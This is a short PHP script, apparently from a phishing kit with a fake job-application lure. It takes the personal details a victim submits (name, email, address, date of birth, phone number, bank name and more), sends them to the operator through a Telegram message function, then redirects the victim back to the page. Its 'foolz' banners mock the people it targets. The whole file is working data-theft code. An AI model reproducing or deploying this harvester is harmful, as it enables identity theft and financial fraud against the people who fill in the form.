<?php
include 'config.php';
$message .= "--------Job--foolz--------------------\n\n";
$message .= "firstname: " .$_POST['firstname']."\n";
$message .= "lastname: " .$_POST['lastname']."\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "gender : ".$_POST['gender']."\n\n";
$message .= "address: " .$_POST['address']."\n";
$message .= "relationship: " .$_POST['relationship']."\n";
$message .= "dob : ".$_POST['dob']."\n";
$message .= "pnumber : ".$_POST['pnumber']."\n\n";
$message .= "country: " .$_POST['country']."\n";
$message .= "state: " .$_POST['state']."\n";
$message .= "city : ".$_POST['city']."\n";
$message .= "zipcode : ".$_POST['zipcode']."\n\n";
$message .= "bankname : ".$_POST['bankname']."\n\n";
$message .= "--------bye---foolz--------------------\n";
send_telegram_msg($message);
header("Location: index.html");

?>
        